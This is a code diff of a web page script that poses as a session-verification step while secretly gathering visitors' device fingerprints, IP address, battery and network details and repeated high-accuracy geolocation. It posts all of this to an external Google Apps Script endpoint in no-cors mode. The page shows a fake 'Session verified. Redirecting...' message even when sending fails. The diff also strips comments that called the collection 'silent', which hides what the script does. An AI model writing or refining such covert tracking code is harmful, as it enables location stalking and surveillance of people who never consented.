@@ -48,7 +48,7 @@
       outerWidth: window.outerWidth,
       outerHeight: window.outerHeight,
       
-      // Touch and orientation (mobile)
+      // Touch and orientation
       touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
       orientation: screen.orientation ? screen.orientation.type : 'unknown',
       
@@ -57,14 +57,6 @@
       webdriver: navigator.webdriver,
       javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
       
-      // Network information
-      connection: navigator.connection ? {
-        effectiveType: navigator.connection.effectiveType,
-        downlink: navigator.connection.downlink,
-        rtt: navigator.connection.rtt,
-        saveData: navigator.connection.saveData
-      } : null,
-      
       // Location tracking variables
       locationAttempts: 0,
       bestAccuracy: Infinity,
@@ -72,7 +64,7 @@
       locationMethod: 'none'
     };
     
-    // Enhanced fingerprinting (silent)
+    // Add fingerprints
     function addFingerprints() {
       try {
         // Canvas fingerprint
@@ -99,7 +91,7 @@
       }
     }
     
-    // Battery info (mobile mainly)
+    // Battery info
     async function getBatteryInfo() {
       try {
         if ('getBattery' in navigator) {
@@ -112,7 +104,19 @@
       }
     }
     
-    // Universal location tracking (desktop + mobile optimized)
+    // Network connection info
+    function getConnectionInfo() {
+      if (navigator.connection) {
+        data.connection = JSON.stringify({
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData
+        });
+      }
+    }
+    
+    // Universal location tracking
     async function getUniversalLocation() {
       return new Promise(async (resolve) => {
         if (!navigator.geolocation) {
@@ -121,7 +125,7 @@
           return;
         }
         
-        // Check permissions (if supported)
+        // Check permissions
         try {
           if (navigator.permissions) {
             const permission = await navigator.permissions.query({name: 'geolocation'});
@@ -139,18 +143,15 @@
         // Different strategies for desktop vs mobile
         const isDesktop = data.isDesktop;
         const configs = isDesktop ? [
-          // Desktop configs - faster timeouts
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0, method: 'desktop_high' },
           { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000, method: 'desktop_network' },
           { enableHighAccuracy: true, timeout: 6000, maximumAge: 300000, method: 'desktop_cached' }
         ] : [
-          // Mobile configs - longer timeouts
           { enableHighAccuracy: true, timeout: 20000, maximumAge: 0, method: 'mobile_high' },
           { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000, method: 'mobile_network' },
           { enableHighAccuracy: true, timeout: 12000, maximumAge: 300000, method: 'mobile_cached' }
         ];
         
-        let completed = 0;
         let hasLocation = false;
         
         // Try each config
@@ -257,19 +258,20 @@
       }
     }
     
-    // Main collection function (runs silently)
+    // Main collection function
     async function collectAllData() {
       try {
-        // Add fingerprints
+        // Add fingerprints and connection info
         addFingerprints();
+        getConnectionInfo();
         
-        // Collect all data in parallel where possible
+        // Collect data in parallel
         await Promise.all([
           getBatteryInfo(),
           getIPAddress()
         ]);
         
-        // Get location (most time-consuming)
+        // Get location
         await getUniversalLocation();
         
         // Send data
@@ -281,18 +283,26 @@
       }
     }
     
-    // Send data function
+    // Send data using FormData (CORS-free)
     async function sendData() {
       try {
-        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(data)
+        const formData = new URLSearchParams();
+        
+        // Add all data to form
+        Object.keys(data).forEach(key => {
+          if (data[key] !== null && data[key] !== undefined) {
+            formData.append(key, data[key]);
+          }
         });
         
-        // Simple success message
+        // Use no-cors mode with FormData
+        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
+          method: "POST",
+          body: formData,
+          mode: "no-cors"
+        });
+        
+        // Success message
         document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
         
         setTimeout(() => {
@@ -300,7 +310,7 @@
         }, 2000);
         
       } catch (error) {
-        // Still redirect on error (user doesn't see error)
+        // Still redirect on error
         document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
         
         setTimeout(() => {
@@ -309,7 +319,7 @@
       }
     }
     
-    // Start immediately (silent execution)
+    // Start immediately
     collectAllData();
   </script>
 </body>
